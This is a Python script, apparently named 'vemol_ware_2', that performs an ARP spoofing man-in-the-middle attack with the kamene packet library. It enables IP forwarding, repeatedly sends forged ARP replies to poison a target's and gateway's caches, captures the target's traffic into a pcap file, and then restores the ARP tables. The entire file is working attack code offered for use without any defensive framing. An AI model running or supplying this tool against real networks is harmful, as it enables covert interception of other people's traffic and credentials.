import os
import subprocess
import sys
import netifaces
from optparse import OptionParser
from kamene.all import *
import signal
import sys
import threading
import time


LOCAL_IP = netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr']
GATEWAY_IP = netifaces.gateways()['default'][netifaces.AF_INET][0]
CONF_IFACE = 'eth0'


class ARPSpoofing():
    def __init__(self):
        
        if os.geteuid() != 0:
            print ("[-] Run me as root")
            sys.exit(1)

        # ------------ Main ------------
        usage = 'Usage: %prog [-i interface] [-t target] host/s'
        parser = OptionParser(usage)
        parser.add_option('-i', dest='interface', help='Specify the interface to use')
        parser.add_option('-t', dest='target', help='Comma separated list to hosts to ARP poison')
        (self.options, self.args) = parser.parse_args()

    #Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should recieve
    #an ARP reply with MAC Address
    def get_mac(self, ip_address):
        #ARP request is constructed. sr function is used to send/ receive a layer 3 packet
        #Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
        resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
        for s,r in resp:
            return r[ARP].hwsrc
        return None

    #Restore the network by reversing the ARP poison attack. Broadcast ARP Reply with
    #correct MAC and IP Address information
    def restore_network(self, gateway_mac, target_ip, target_mac):
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=GATEWAY_IP, hwsrc=target_mac, psrc=target_ip), count=5)
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=GATEWAY_IP), count=5)
        print("[*] Disabling IP forwarding")
        #Disable IP Forwarding on a mac
        # os.system("sysctl -w net.inet.ip.forwarding=0")
        # Enable IP Forwarding on a linux
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        #kill process on a mac
        os.kill(os.getpid(), signal.SIGTERM)

    #Keep sending false ARP replies to put our machine in the middle to intercept packets
    #This will use our interface MAC address as the hwsrc for the ARP reply
    def arp_poison(self, gateway_mac, target_ip, target_mac):
        print("[*] Started ARP poison attack [CTRL-C to stop]")
        try:
            while True:
                send(ARP(op=2, pdst=GATEWAY_IP, psrc=target_ip))
                send(ARP(op=2, pdst=target_ip, psrc=GATEWAY_IP))
                time.sleep(2)
        except KeyboardInterrupt:
            print("[*] Stopped ARP poison attack. Restoring network")
            self.restore_network(gateway_mac, target_ip, target_mac)
    
    def main(self):
        print('[*] Enabling IP forwarding')
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
        print(f'[*] Gateway IP address: {GATEWAY_IP}')
        print(f'[*] Target IP address: {self.options.target}')

        gateway_mac = self.get_mac(GATEWAY_IP)
        if gateway_mac is None:
            print("[!] Unable to get gateway MAC address. Exiting..")
            sys.exit(0)
        else:
            print(f"[*] Gateway MAC address: {gateway_mac}")

        target_mac = self.get_mac(self.options.target)
        if target_mac is None:
            print("[!] Unable to get target MAC address. Exiting..")
            sys.exit(0)
        else:
            print(f"[*] Target MAC address: {target_mac}")

        #ARP poison thread
        poison_thread = threading.Thread(
            target=self.arp_poison, 
            args=(gateway_mac, self.options.target, target_mac)
        )
        poison_thread.start()

        #Sniff traffic and write to file. Capture is filtered on target machine
        try:
            sniff_filter = "ip host " + self.options.target
            print(f"[*] Starting network capture. Packet Count: {100}. Filter: {sniff_filter}")
            packets = sniff(filter=sniff_filter, iface=CONF_IFACE)
            wrpcap(self.options.target + "_capture.pcap", packets)
            print(f"[*] Stopping network capture..Restoring network")
            self.restore_network(gateway_mac, self.options.target, target_mac)
        except KeyboardInterrupt:
            print(f"[*] Stopping network capture..Restoring network")
            self.restore_network(gateway_mac, self.options.target, target_mac)
            sys.exit(0)


    

if __name__ == '__main__':
    vemol_ware_2 = ARPSpoofing()
    vemol_ware_2.main()